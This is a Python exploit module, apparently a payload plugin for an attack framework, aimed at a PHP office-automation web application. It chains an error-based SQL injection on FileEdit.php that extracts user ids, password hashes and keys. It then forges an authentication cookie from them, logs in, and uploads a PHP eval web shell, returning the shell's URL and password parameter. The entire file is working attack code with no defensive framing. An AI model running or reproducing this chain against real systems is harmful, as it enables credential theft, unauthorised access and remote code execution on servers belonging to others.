#!/usr/bin/env python
# -*- coding: utf-8 -*-

# author: sevenqsh

import sys
import requests
sys.path.append('..')
from models.payload import Payload, PayloadFailException
from configuration import configuration as config
from utils import Utils
import re
import json


prefix = 'toa_'

class PHPOA(Payload):
    def attack(self):
        uid,password,userkey = self._sqlInject()
        # print(uid+password+userkey)
        auth = self._getAuth(uid,password,userkey)
        session = self._login(auth)
        return self._upfile(session,uid)

    def _sqlInject(self):
        url = 'http://{}/ntko/FileEdit.php'.format(self.host)
        payload = "1' and updatexml(1,concat(0x7e,(SELECT substring(group_concat(id,0x3e,password,0x3e,userkey),{start},32) FROM "+prefix+"user)),1)#"
        offset = 1
        result = ''
        try:
            while offset:
                res = requests.get(url,params={
                    'uid':payload.format(start=offset)
                },timeout=2)
                match = re.findall(r"XPATH syntax error: '~(.+)'",res.text)
                print(match)
                if match:
                    result += match[0]
                    offset += 31
                else:
                    offset = 0
            return tuple(result.split('>'))
        except:
            raise PayloadFailException('sql inject error')
        

    def _getAuth(self,uid,password,userkey):
        print('uid:{}'.format(uid))
        print('password:{}'.format(password))
        print('userkey:{}'.format(userkey))
        auth = Utils.md5(password+userkey+'a')
        print(auth)
        auth = Utils.base64('{}\t{}'.format(uid,auth))
        return auth

    def _login(self,auth):
        try:
            url = 'http://{}/desktop.php'.format(self.host)
            s = requests.Session()
            res = s.get(url,cookies={
                prefix+'auth':auth
            },headers={
                'User-Agent':'a'
            },timeout=2)
            return s
        except:
            raise PayloadFailException('login fail')
        
    def _upfile(self,s,uid):
        url = 'http://{}/upload/index.php?userid={}'.format(self.host,uid)
        try:
            res = s.post(url,files={
                'files[]':(Utils.randmd5()+'.php','<?php @eval($_POST[c]);?>','text/php')
            },timeout=2)
            obj = json.loads(res.text)
            url = obj['files'][0]['url']
            url = 'http://{}{}'.format(self.host,url.lstrip('..'))
            return url,'c'
        except Exception as e:
            raise PayloadFailException('upload file fail')
        



